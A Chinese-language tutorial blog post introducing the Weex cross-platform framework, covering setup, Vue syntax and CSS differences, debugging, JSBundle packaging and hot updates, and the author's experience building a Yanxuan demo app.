<p>入门 Weex 前需要了解以下知识，这样能帮助你更快的掌握<br>Node：<a href=""http://www.runoob.com/nodejs/nodejs-tutorial.html"" rel=""nofollow noreferrer"">《Node.js 教程》</a><br>Vue：<a href=""https://cn.vuejs.org/v2/guide/"" rel=""nofollow noreferrer"">《Vue.js官方教程》</a><br>ES6：<a href=""http://es6.ruanyifeng.com/"" rel=""nofollow noreferrer"">《ECMAScript 6 入门》</a><br>再者就是 ios 和 android 开发语法的入门和编辑器的使用</p>
<h1>环境</h1>
<h2>系统环境要求</h2>
<p>IOS : <code>MacOS</code>, <code>黑苹果</code><br>Android :<code>MacOS</code>,  <code>Linux</code>, <code>Windows</code></p>
<h2>配置环境</h2>
<p>你可以参考官方文档安装必须的依赖环境 <a href=""http://weex.apache.org/cn/guide/set-up-env.html"" rel=""nofollow noreferrer"">http://weex.apache.org/cn/guide/set-up-env.html</a>，<br>也可以直接安装以下环境</p>
<ul>
<li><a href=""https://nodejs.org/"" rel=""nofollow noreferrer"">node</a></li>
<li>npm</li>
<li><a href=""https://github.com/weexteam/weex-toolkit"" rel=""nofollow noreferrer"">weex-toolkit</a></li>
<li><a href=""https://developer.apple.com/xcode/"" rel=""nofollow noreferrer"">Xcode</a></li>
</ul>
<p>安装 Xcode IDE 和 Xcode 的命令行工具（IOS 开发依赖）</p>
<ul><li>
<a href=""http://www.android-studio.org/"" rel=""nofollow noreferrer"">Android Studio</a><p><strong>下载必须的插件：</strong></p>
</li></ul>
<p>a) JDK1.8+<br>b) Show Package Details<br>c) Android SDK Build Tools <br>d) Android Support Repository</p>
<p><strong>配置基础环境：</strong><br>a) ANDROID_HOME （如运行是遇到问题可参考此文 <a href=""http://www.jianshu.com/p/a77396301b22"" rel=""nofollow noreferrer"">http://www.jianshu.com/p/a77396301b22</a>）<br>b) JAVA_HOME</p>
<h2>Hello Weex</h2>
<p>官方文档上的入门 Hello world 是 web 端的，紧接着介绍了如何「<strong>集成 Weex 到已有应用</strong>」</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000012869673"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>但是，身为一个 web 前端开发者，如果你不懂原生语音的话，介绍这些并不能起到很好的引导作用，因为web前端开发者都有「<strong><em>一统前端界</em></strong>」的野心（Web+Android+IOS），「寄人篱下」只能是暂时的。</p>
<p>快速创建并运行一个纯 Weex App 对于「纯」前端同学来说，才是有意思的事儿。<br>但：</p>
<blockquote><strong><em>为什么文档要这么设计也是跟Weex的定位有关的，读完下文后续你就慢慢懂了，后面我将做总结解释</em></strong></blockquote>
<p>如果你在官方教程里没有找到创建工程的教程，可以阅读此文<a href=""http://www.jianshu.com/p/084b5b1e7ffe"" rel=""nofollow noreferrer"">《Weex 快速创建工程 Hello World》</a></p>
<h1>Vue Native</h1>
<p>Weex 在迭代的过程中选择了于 Vue 2.0 握手，因为该版本的 Vue 加入了 Virtual-DOM 和预编译器的设计，使得该框架在运行时能够脱离 HTML 和 CSS 解析，只依赖 JavaScript，如此，Vue 在和 Weex 合作后，便获得了使用 JS 预编译原生的组件 UI 的能力。</p>
<p>同 React Native 一样，有人也将 Weex 叫做 Vue Native。</p>
<p>如果你对 Vue 还不了解，可以先学习【预科】部分推荐的<a href=""https://cn.vuejs.org/v2/guide/"" rel=""nofollow noreferrer"">《Vue.js 官方教程》</a>。</p>
<p>那么接下来我们讲讲，Vue 在 Weex 中的不同</p>
<h1>Vue 在 Weex 中的不同</h1>
<p>虽说 Weex 使用 Vue 语言写的，但毕竟是需要在不同平台间运行的，虽然大部分语法都有支持，但是依然有部分语法是不同的</p>
<h2>语法差异</h2>
<h3>1、“html标签”</h3>
<p>目前 Weex 支持了基本的容器 (div)、文本 (text)、图片 (image)、视频 (video) 等<strong>组件</strong>，注意是组件，而不是标签，虽然使用起来跟 html 标签很像，至于其他标签基本可以使用以上组件组合而成。</p>
<h3>2、Weex 环境中没有 DOM</h3>
<p>因为 Weex 解析 vue 得到的并不是 dom，而是原生布局树</p>
<h3>3、支持有限的事件</h3>
<p>并不支持 Web 中所有的事件类型，详情请参考<a href=""http://weex.apache.org/cn/references/common-event.html"" rel=""nofollow noreferrer"">《通用事件》</a></p>
<h3>4、没有 BOM 但可以调用原生 API</h3>
<p>在 Weex 中能够调用移动设备原生 API，使用方法是通过注册、调用模块来实现。其中有一些模块是 Weex 内置的，如 clipboard 、 navigator 、storage 等。<br><a href=""http://weex.apache.org/cn/references/modules/clipboard.html"" rel=""nofollow noreferrer"">《clipboard 剪切板》</a><br><a href=""http://weex.apache.org/cn/references/modules/navigator.html"" rel=""nofollow noreferrer"">《navigator 导航控制》</a><br><a href=""http://weex.apache.org/cn/references/modules/storage.html"" rel=""nofollow noreferrer"">《storage 本地存储 》</a><br>为了保持框架的通用性，Weex 内置的原生模块有限，不过 Weex 提供了横向扩展的能力，可以扩展原生模块，具体的扩展方法请参考<a href=""http://weex.apache.org/cn/references/advanced/index.html"" rel=""nofollow noreferrer"">《iOS 扩展》</a> 和<a href=""http://weex.apache.org/cn/references/advanced/extend-to-android.html"" rel=""nofollow noreferrer"">《Android 扩展》</a>。</p>
<h2>样式差异</h2>
<p>Weex 中的样式是由原生渲染器解析的，出于性能和功能复杂度的考虑，Weex 对 CSS 的特性做了一些取舍<br>1、Weex 中只支持单个类名选择器，不支持关系选择器，也不支持属性选择器。<br>2、组件级别的作用域，为了保持 web 和 Native 的一致性，需要<code>&lt;style scoped&gt;</code>写法<br>3、支持了基本的盒模型和 flexbox 布局，详情可参考<a href=""http://weex.apache.org/cn/references/common-style.html"" rel=""nofollow noreferrer"">Weex 通用样式文档</a>。但是需要注意的是，</p>
<ul>
<li>不支持<code>display: none;</code>可用<code>opacity: 0;</code>代替，（opacity&lt;=0.01时，元素可点透）</li>
<li>样式属性暂不支持简写（提高解析效率）</li>
<li>flex 布局需要注意 web 的兼容性</li>
<li>css 不支持 3D 变换</li>
</ul>
<h1>Weex 开发&amp;调试</h1>
<h2>Vue 语法</h2>
<p>举个栗子，以下是严选App Demo首页的简化代码</p>
<pre><code class=""vue"">&lt;template&gt;
    &lt;div class=""wrapper""&gt;
        &lt;text class=""iconfont""&gt;&lt;/text&gt;
        &lt;home-header&gt;&lt;/home-header&gt;
        &lt;scroller class=""main-list"" offset-accuracy=""300px""&gt;
            &lt;refresher&gt;&lt;/refresher&gt;
            &lt;div class=""cell-button"" @click=""jumpWeb('https://m.you.163.com')""&gt;
                &lt;yx-slider :imageList=""YXBanners"" &gt;&lt;/yx-slider&gt;
            &lt;/div&gt;
            &lt;div class=""cell-button""&gt;
                &lt;block-1 :title=""block1.title"" :items=""block1.items""&gt;&lt;/block-1&gt;
            &lt;/div&gt;
        &lt;/scroller&gt;
    &lt;/div&gt;
&lt;/template&gt;
&lt;style scoped&gt;
    .iconfont {  font-family:iconfont;  }
    .main-list{ position: fixed; top: 168px; bottom: 90px; left: 0; right: 0;  }
&lt;/style&gt;
&lt;script&gt;
    var navigator = weex.requireModule('navigator');
    import util from '../../src/assets/util';
    import Header from '../components/Header.vue';
    import refresher from '../components/refresh.vue';
    import YXSlider from '../components/YXSlider.vue';
    import Block1 from '../components/Block1.vue';
    export default {
        components: {
            'home-header': Header,
            'refresher': refresher,
            'yx-slider': YXSlider,
            'block-1': Block1
        },
        data () {
            return {
                YXBanners: [
                    { title: '', src: 'http://doc.zwwill.com/yanxuan/imgs/banner-1.jpg'},
                    { title: '', src: 'http://doc.zwwill.com/yanxuan/imgs/banner-2.jpg'},
                    { title: '', src: 'http://doc.zwwill.com/yanxuan/imgs/banner-3.jpg'}
                ]
            }
        },
        methods: {
            jumpWeb (_url) {
                const url = this.$getConfig().bundleUrl;
                navigator.push({
                    url: util.setBundleUrl(url, 'page/web.js?weburl='+_url) ,
                    animated: ""true""
                });
            }
        }
    }
&lt;/script&gt;</code></pre>
<p>如果以上代码脱离工程单独出现，基本上是无法得知他是 Weex 工程。此处可切实感受到 Weex 的 web 开发体验</p>
<h2>名存实亡的&lt;标签/&gt;</h2>
<pre><code class=""html"">&lt;template&gt;
  &lt;div&gt;
    &lt;text v-for=""(v, i) in list"" class=""text""&gt;{{v}}&lt;/text&gt;
    &lt;image style="""" src=""""&gt;&lt;/image&gt;
    &lt;video class=""video"" :src=""src"" autoplay controls @start=""onstart"" @pause=""onpause"" @finish=""onfinish"" @fail=""onfail""&gt;&lt;/video&gt;
  &lt;/div&gt;
&lt;/template&gt;</code></pre>
<p>Weex 工程中常用的标签有<code>&lt;div /&gt;</code>，<code>&lt;text /&gt;</code>，<code>&lt;image /&gt;</code>，<code>&lt;video /&gt;</code>（组件另算），由此四种标签基本可以满足绝大多数场景的需求，虽说此标签同 web 工程下的标签用法一致，但此处的标签已不再是我们前端口中常提的 html 标签，而且名存实亡的 Weex 标签，确切讲是 Weex 组件。</p>
<p>通过<strong>weex-loader、vue-loader、weex-vue-render</strong>的解析最终转换输出的便是实际的组件，有此设计只是为了完成「<strong>web开发体验</strong>」的目标。但是我们身为上层的开发人员要清楚自己每天「把玩」的到底是个什么「鬼」。</p>
<h2>阉割版 CSS</h2>
<p>其实用阉割版来形容 Weex 的 css 支持度并不合适，但如果从「web开发体验」的角度来衡量，那么这个形容词也是可以理解的。（此处对 Weex 寄有厚望^_^）</p>
<h3>单位</h3>
<p>Weex 中的所有 css 属性值的单位均为 <code>px</code>，也可省略不写，系统会默认为  <code>px</code> 单位。</p>
<h3>选择器</h3>
<p>Weex 中只支持单个类名选择器，不支持关系选择器，也不支持属性选择器。</p>
<pre><code class=""css"">/* 支持单个类名选择器 */
.one-class {
  font-size: 36px;
}
/* 不支持关系选择器 */
.parent &gt; .child {
  padding-top: 10px;
}
/* 不支持属性选择器，不支持 `v-cloak` 指令 */
[v-cloak] {
  color: #FF6600;
}</code></pre>
<p>这个只是对样式定义的限制，不影响样式类名的使用，在标签中可以添加多个样式类名，如：</p>
<pre><code>&lt;template&gt;
  &lt;div class=""one two three""&gt;&lt;div&gt;
&lt;/template&gt;</code></pre>
<h3>盒模型</h3>
<p>weex支持css基本的盒模型结构，但需要注意的是</p>
<ul>
<li>
<code>box-sizing</code> 属性值默认为 <code>border-box</code>
</li>
<li>
<code>margin</code>，<code>padding</code>，<code>border</code>等属性暂不支持合并简写</li>
</ul>
<h3>FlexBox</h3>
<p>Weex 中对 flexbox 布局支持度很高，但依然有部分属性并不支持，如 <code>align-items:baseline;</code>、<code>align-content:space-around;</code>、<code>align-self:wrap_reverse;</code>等。</p>
<p>具体 Weex 对 flexbox 的支持和布局算法，可通过此文进行了解<a href=""http://www.jianshu.com/p/d085032d4788"" rel=""nofollow noreferrer"">由 FlexBox 算法强力驱动的 Weex 布局引擎</a>，此处便不再赘述。</p>
<h3>显隐性</h3>
<p>在 Weex 的 ios 和 android 端，并不支持 <code>display</code> 属性。</p>
<p>因此，不能使用 <code>display:none;</code> 来控制元素的显隐性，所以 vue 语法中的 <code>v-show</code> 条件渲染是不生效的。</p>
<p>我们可以使用  <code>v-if</code> 代替，或者用  <code>opacity:0;</code> 来模拟。</p>
<p>需要注意的是，ios和android端并不能使用 <code>opacity:0;</code> 来完全模拟 <code>visibility: hidden;</code>，因为，当<br> opacity 的只小于等于 0.01 时，native 控件便会消失，占位空间还在，但用户无法进行交互操作，点击时会发生点透效果。</p>
<h3>CSS 3</h3>
<p>Weex 支持 css3 属性，虽然支持并不够，但相较 React Native 的「不能用」已经是强大很多了。</p>
<p>以下几种属性我们在开发前需要知道她的支持度</p>
<ul>
<li>transform：目前只支持 2D 转换</li>
<li>transition：v0.16.0+ 的 SDK 版本支持css过度动画，可根据情况配合内建组件 <code>animation</code> 实现动画交互</li>
<li>linear-gradient：目前只支持双色渐变色</li>
<li>font-family：Weex 目前只支持 ttf 和 woff 字体格式的自定义字体</li>
</ul>
<h2>第三方工具库</h2>
<p>由于使用了增强版的 webpak 打包工具 weexpack，支持第三方框架也是件自然而然的事情。</p>
<p>常用的有 <code>vuex</code>、<code>vue-router</code> 等，可根据项目实际情况引入需要的第三方工具库</p>
<h2>npm 包管理</h2>
<p>npm 包管理是前端开发朋友们再熟悉不过的包管理方式了。这也是为什么 React Native 和 Weex 都选择这种管理方式的原因。</p>
<p>以下是本工程的 package.json 文件，这里就不做讲解了，不熟悉的朋友点这里-&gt;<a href=""http://www.runoob.com/nodejs/nodejs-npm.html"" rel=""nofollow noreferrer"">NPM 使用介绍</a></p>
<pre><code>{
  ""name"": ""yanxuan-weex"",
  ""version"": ""1.0.0"",
  ""description"": ""a weex project"",
  ""main"": ""index.js"",
  ""scripts"": {
    ""build"": ""webpack"",
    ""build_plugin"": ""webpack --config ./tools/webpack.config.plugin.js --color"",
    ""dev"": ""weex-builder src dist -w"",
    ""serve"": ""webpack-dev-server --config webpack.dev.js -p --open""
  },
  ""keywords"": [""weex""],
  ""author"": ""zwwill"",
  ""license"": ""MIT"",
  ""dependencies"": {
    ""vue"": ""^2.4.2"",
    ""vue-router"": ""^2.7.0"",
    ""vuex"": ""^2.1.1"",
    ""vuex-router-sync"": ""^4.3.0"",
    ""weex-html5"": ""^0.4.1"",
    ""weex-vue-render"": ""^0.11.2""
  },
  ""devDependencies"": {
    ""babel-core"": ""^6.21.0"",
    ""babel-loader"": ""^6.2.4"",
    ""babel-plugin-add-module-exports"": ""^0.2.1"",
    ""babel-plugin-transform-runtime"": ""^6.9.0"",
    ""babel-preset-es2015"": ""^6.9.0"",
    ""babel-runtime"": ""^6.9.2"",
    ""css-loader"": ""^0.26.1"",
    ""history"": ""^4.7.2"",
    ""quick-local-ip"": ""^1.0.7"",
    ""vue-loader"": ""^13.0.4"",
    ""vue-template-compiler"": ""^2.4.2"",
    ""webpack"": ""^2.7.0"",
    ""webpack-dev-server"": ""^2.4.2"",
    ""weex-builder"": ""^0.2.7"",
    ""weex-loader"": ""^0.4.5"",
    ""weex-router"": ""0.0.1""
  }
}</code></pre>
<h2>UI 尺寸适配</h2>
<p>Weex 容器默认的显示宽度 (viewport) 是 750px，页面中的所有组件都会以 750px 作为满屏宽度。</p>
<p>这很像移动设备的逻辑像，比如 iPhone 6 的物理像素宽为 750，逻辑像素</p>
<table>
<thead><tr>
<th align=""center"">Type</th>
<th align=""center"">iPhone 3G</th>
<th align=""center"">iPhone 4</th>
<th align=""center"">iPhone 6</th>
<th colspan=""2"" align=""center"">iPhone 6Plus</th>
</tr></thead>
<tbody>
<tr>
<td align=""center"">物理像素</td>
<td align=""center"">320x480</td>
<td align=""center"">640x960</td>
<td align=""center"">750x1134</td>
<td align=""center"">1080x1920</td>
</tr>
<tr>
<td align=""center"">逻辑像素</td>
<td align=""center"">320x480</td>
<td align=""center"">320x480</td>
<td align=""center"">375x667</td>
<td align=""center"">414x736</td>
</tr>
<tr>
<td align=""center"">像素比</td>
<td align=""center"">@1x</td>
<td align=""center"">@2x</td>
<td align=""center"">@2x</td>
<td align=""center"">@3x</td>
</tr>
</tbody>
</table>
<p>类比在 Weex 中，如果所有的显示宽度都是用默认值 750，那么显示出来的实际像素信息为</p>
<table>
<thead><tr>
<th align=""center"">Type</th>
<th align=""center"">iPhone 3G</th>
<th align=""center"">iPhone 4</th>
<th align=""center"">iPhone 6</th>
<th colspan=""2"" align=""center"">iPhone 6Plus</th>
</tr></thead>
<tbody>
<tr>
<td align=""center"">物理像素</td>
<td align=""center"">320x480</td>
<td align=""center"">640x960</td>
<td align=""center"">750x1134</td>
<td align=""center"">1080x1920</td>
</tr>
<tr>
<td align=""center"">显示像素</td>
<td align=""center"">750x1125</td>
<td align=""center"">750x1125</td>
<td align=""center"">750x1134</td>
<td align=""center"">750x1333</td>
</tr>
<tr>
<td align=""center"">像素比</td>
<td align=""center"">@0.427x</td>
<td align=""center"">@0.85x</td>
<td align=""center"">@1x</td>
<td align=""center"">@1.44x</td>
</tr>
</tbody>
</table>
<p>所以我们在使用 Weex 做 UI 适配时就没有所谓的 @2x 图和 @3x 图，所有的尺寸都是Weex帮我们根据<br> 750 作为基数宽做的缩放。</p>
<p>当然，Weex 提供了改变此显示宽度的 API，<code>setViewport</code>，通过此方法可以改变页面的显示宽度，可以实现每个页面根据自己的需求改变基数逻辑尺寸</p>
<p>因此对于一些固定的 icon，不建议使用普通的静态图片或者雪碧图，这里建议使用矢量的字体图片，有以下优点：</p>
<ol>
<li>适量图不会变糊</li>
<li>使用方便，通过 css 的字号控制大小，不用适配机型和屏幕尺寸</li>
<li>引用 ttf 文件，体积小，且容易更新</li>
</ol>
<h2>本地调试</h2>
<p>Weex 的调试方式有多种，如果说RN的调试模式是解放了原生开发的调试，那么 Weex 的调试方式可以说是赋予了 web 模式调试原生应用的能力。</p>
<h3>方法一</h3>
<p>此方法多用于解决 bug，检测控件的布局问题</p>
<pre><code># 调试单个页面
$ weex debug your_weex.vue
# 调试整个工程
$weex debug your/path -e App.vue</code></pre>
<p>执行调试命令后，会将指定的文件打包成 JSBundle，并启动一个 weex Devtool 服务（<a href=""http://localhost"" rel=""nofollow noreferrer"">http://localhost</a>:8088可访问，如下图），同时将 JSBundle 文件传递至该服务跟路径下的weex文件夹内（<a href=""http://localhost"" rel=""nofollow noreferrer"">http://localhost</a>:8088/weex/App.js，实际是下图右边二维码的的内容）。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000011150040"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>使用 Weex Playground App 扫下左二维码进入调试模，见下图</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000011150041"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>再次扫码右方二维码，点击【inspector】即可进入调试模式。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000011150042"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>每一个控件都是相同的数据结构</p>
<pre><code>&lt;view class=""WXText"" frame=""{{0,0},{414,736}}"" hidden=""NO"" alpha=""1"" opaque=""YES""&gt;&lt;/view&gt;</code></pre>
<ul>
<li>class：代表原声空间类型</li>
<li>frame：表示空间的坐标和大小</li>
<li>hidden：代表显隐性，css中visibility设置的值</li>
<li>alpha：不透明度，css中opacity设置的值</li>
<li>opaque：默认为YES，打开绘图系统性能优化的开关，即不去计算多透明块重合后的真正颜色，从而减小GPU的压力，weex中具体有没有地方可以设置这个开关暂时不清楚，有猎奇心的朋友可以研究下。</li>
</ul>
<h3>方法二</h3>
<p>此方法多用于开发调试，试试观察结果</p>
<pre><code>$ weex your_weex.vue</code></pre>
<p>如果出现 access 权限报错，使用管理员指令</p>
<pre><code>$ sudo weex your_weex.vue</code></pre>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000011150043"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>此时本地同时启动一个watch的服务器用于检查代码变更，自动重新构建 JSBundle，视觉同步刷新。</p>
<p>上图看到的效果即为H5页面的效果，我们一般在整个单页编写完成后在使用 Weex Playground App 扫码查看真机效果，或者你也可以在编写的同时使用真机观察代码的运行效果，每次重新构建包到重绘的速度还是很快的。</p>
<p>但前提是你要保证，你的手机和电脑的连在同一个局域网下，并且使用IP访问。</p>
<h1>Weex 的原理</h1>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000011150044"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>虽然说，Weex 可以抹平三端开发的差异，但是知其然也应知其所以然使用起来才能游刃有余。</p>
<h2>打包</h2>
<p>熟悉 React Native 的人都知道， React Native 的发布实际上就是发布一个 JSBundle，Weex 也是这样，但不同的是，Weex 将工程进行分包，发布多个 JSBundle。因为 Weex 是单页独立开发的，每个页面都将通过 Weex 打包器将 vue/we 页面打包成一个单独的 JSBundle，这样的好处在于减少单个 bundle 包的大小，使其变的足够小巧轻量，提高增量更新的效率。</p>
<pre><code># 仅打包
$ npm run build
# 打包+构建
$ weex build ios
# 打包+构建+安装执行
$ weex run ios</code></pre>
<p>以上三种均会触发 Weex 对工程进行打包。<br>在我们执行了以上打包命令后，所有的工程文件将被单独打成一个独立的 JSBundle，如下：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000011150045"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>打包后的 JSBundle 有两种格式</p>
<pre><code class=""javascript""># 由.vue文件打包出来的包格式（简写），使用 vue 2.0 语法编写
// { ""framework"": ""Vue""} 
/******/ (function(modules) { 
          .......
/******/ })</code></pre>
<pre><code class=""javascript""># 由.we文件打包出来的包格式（简写），使用 weex 语法编写
// { ""framework"": ""Weex"" }
/******/ (function(modules) { 
          .......
/******/ })</code></pre>
<p>不同的头部是要告诉使用什么语法解析此JSBundle。</p>
<p>至此，我们准备「热更新的包」就已经准备完毕了，接下就是发包执行了。</p>
<h2>发包</h2>
<p>打包后的 JSBundle 一般发布到发包服务器上，客户端从服务器更新包后即可在下次启动执行新的版本，而无需重新下载 app，因为运行依赖的 WeexSDK 已经存在于客户端了，除非新包依赖于新的 SDK，这也是热更新的基本原理。</p>
<blockquote>
<p>【WeexSDK】包括</p>
<ul>
<li>【JS Framework】JSBundle 的执行环境</li>
<li>【JS-Native Bridge】中间件或者叫通讯桥梁，也叫【Weex Runtime】</li>
<li>【Native Render Engine】解析 js 端发出的指令做原生控件布局渲染</li>
</ul>
</blockquote>
<h2>执行</h2>
<p>Weex 的 iOS 和 Android 客户端的【JSFramework】中都会运行一个 JavaScript 引擎，来执行 JS bundle，同时向各端的渲染层发送规范化的指令，调度客户端的渲染和其它各种能力。iOS 下选择了 JavaScriptCore 内核，而在 Android 下选择了 UC 提供的 v8 内核（RN两端都是JavaScriptCore 内核）。</p>
<p>JSBundle 被 push 到客户端后就会在 JSFramework 中执行，最终输出三端可读性的 VNode 节点，数据结构简化如下：</p>
<pre><code>{
  tag: 'div',
  data: {
    staticStyle: { justifyContent: 'center' }
  },
  children: [{
    tag: 'text',
    data: {
      staticClass: 'txt'
    },
    context: {
      $options: {
        style: {
          freestyle: {
            textAlign: 'center',
            fontSize: 200
          }
        }
      }
    },
    children: [{
      tag: '',
      text: '文字'
    }]
  }]
}</code></pre>
<p>有了统一的 VNode 节点，各端即可根据自己的方法解析渲染原生UI了，之前的所有操作都是一致的，包括文件格式、打包编译过程、模板指令、组件的生命周期、数据绑定等。</p>
<p>然而由于目标执行环境不同（浏览器和 Weex 容器），在渲染真实原生 UI 的时候调用的接口也不同。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000011150046"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>此过程发生在【Weex SDK】的【Weex Runtime】中。</p>
<p>最总【Weex Runtime】发起渲染指令<code>callNative({...})</code>有RenderEngine完成渲染</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000011150047"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000011150048"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h2>总结一下</h2>
<ul>
<li>Weex 文件分包打包成单个 JSBundle 文件</li>
<li>发布到发包服务器上，通过热更新 push 到用户的客户端，交由【Weex SDK】执行解析</li>
<li>SDK 中的【JS Framework】执行 Bundle 脚本生成 Virtual DOM</li>
<li>Virtual DOM 经由各端执行环境【Weex Runtime】解析翻译成执行指令</li>
<li>【Native RenderEngine】接收到指令后执行渲染操作，作出渲染出完整的界面</li>
</ul>
<p>官方配图：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000011150049"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>扩充配图：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000011150050"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h1>Weex 的工作模式</h1>
<h2>1. 全页模式</h2>
<p>目前支持单页使用或整个 App 使用 Weex 开发（还不完善，需要开发 Router 和生命周期管理）。</p>
<p>本文先行的严选 demo 便是使用第二种全屏模式，使用 Weex 开发整个 App，期间触碰到 Weex 的在此模式下诸多不足，如 StatusBar 控制、Tab 切换、开场动画自定义、3DTouch、 Widget 等等原生的特色功能没有现成的 API，需要我们自己扩展，甚至扩展不了。因此并不能完全“灭掉”原生。</p>
<p>所以，目前在阿里内部使用较多的是此模式中的单页模式，这也是为什么官方文档在介绍原理后就直接奔入<strong>集成到原生应用</strong>的主题上去了。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000011150051"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h2>2. Native Component 模式</h2>
<p>把 Weex 当作一个 iOS/Android 组件来使用，类比 ImageView。这类需求遍布手淘主链路，如首页、主搜结果、交易组件化等，这类 Native 页面主体已经很稳定，但是局部动态化需求旺盛导致频繁发版，解决这类问题也是 Weex 的重点。</p>
<h2>3. H5 Component 模式</h2>
<p>在 H5 种使用 Weex，类比 WVC。一些较复杂或特殊的 H5 页面短期内无法完全转为 Weex 全页模式（或RN），比如互动类页面、一些复杂频道页等。这个痛点的解决办法是：在现有的H5页面上做微调，引入Native 解决长列表内存暴增、滚动不流畅、动画/手势体验差等问题。</p>
<p>另外，WVC 将会融入到 Weex 中，成为 Weex 的 H5 Components 模式。</p>
<h1>严选 App Demo 实现过程中的感想</h1>
<h2>Vue-Router &amp; Tab</h2>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000011150052"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>由于 Weex 没有封装 Tab 的组件，因此笔者使用了很多方法来实现Tab切换的功能。</p>
<p>1、vue-router：router 思想方便管理，但是每次切换都是新的实例，没有tab模式<br>2、opacity、visablity：此处需要注意，Weex的渲染机制和web是有区别的，对夫层设置 opacity 或者visiablity隐藏是无法同时隐藏定位为<code>position:fixed;</code> 的子元素。<br>3、position、transform：改变 tab 层的位置，此方法在定位为 <code>position:fixed;</code> 的子元素上依然无效。</p>
<h2>image &amp; iconfont</h2>
<p>Weex 中所有的静态资源基本都是网络资源，包括图片、字体图片等，所以使用 iconfont 图标是再合适不过的了。</p>
<p>此 demo 中所有的 icon 均使用 的iconfont。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000011150053"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>此处强烈推荐一个站点 <a href=""http://www.iconfont.cn"" rel=""nofollow noreferrer"">www.iconfont.cn</a>。</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000011150054"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>在此平台你可以找到几乎所有你需要的 icon，你也可以上传自己的 icon 到自己创建的项目中。同时该系统还提供生成ttf、woff 资源，并且做了 cdn 加速和 gzip 压缩，是不是跟 Weex很配呢？</p>
<p>不过也有风险，就是，如果哪天阿里不在维护并回收该平台的资源了，你的 app 可能就会变成这样，全是方框，或者 padding 掉你 H5 的页面</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000011150055"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>当然，这种及情况出现的几率很小，如果你是一个大公司，你手上有更好的资源急速方案，那就自己保存吧。</p>
<h2>webview</h2>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000011150056"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>UIWebView是我们开发App常用的一个控件，不过Weex帮我们封装好的API明显时不够用的，目前只有<code>pagestart </code>、<code>pagefinish </code>、<code>error </code>，并没有封装像RN那样的<code>onShouldStartLoadWithRequest</code>拦截地址请求的API，在我看来，这有些不合理，并不清楚轮子的制造者是什么意图。</p>
<h2>性能</h2>
<p>性能是一个大课题，在此就不做展开了，只稍微提及一些我们开发需要注意的几点</p>
<ul>
<li>性能影响点：UI更新&gt;UI事件响应&gt;后台运算</li>
<li>合理优化过场&amp;动画，过场和 console 容易引起 app crash 需要注意</li>
<li>降低 js &lt;-&gt; native 的通信频率</li>
<li>优化list结构，降低重排重绘压力</li>
<li>把优先级低且耗时较长的工作推后处理</li>
</ul>
<h2>Weex 的现状</h2>
<h3>Weex 解决了的</h3>
<h4>我的发布我做主（热更新）</h4>
<p>脚本语言天生自带“热更新”，Weex 针对 React Native 的热更新策略做了优化，将 WeexSDK 事先绑到了客户端上，并且对 JSBundle 进行分包增量更新，大大提高了热更新的效率。</p>
<p>但优点也是缺点，如果新包依赖于心的 SDK，此情况下，我们需要发布还有新 SDK 的 app 到应用市场，用户也须从市场更新此 app。不够随着 WeexSDK 版本的稳定后，相信此策略的优势就会凸显出来。</p>
<h4>性能问题</h4>
<p>Weex 是一种轻量级、可扩展、高性能框架。集成也很方便，可以直接在 HTML5 页面嵌入，也可嵌在原生UI中。由于和 React Native 一样，都会调用 Native 端的原生控件，所以在性能上比 Hybrid 高出一个层次。</p>
<h4>统一三端</h4>
<p>虽说这是一个大胆的实践，但对于大前端社区的统一有着推动作用，显然阿里在这一方面已经迈出了第一步。基本解决了三端同等需求导致资源浪费的痛点。</p>
<p>但后期可能会出现这种现象，开发一个三端的 App 会从原来的个人变成四个人，多出来的那一个人负责开发 Weex 单页。</p>
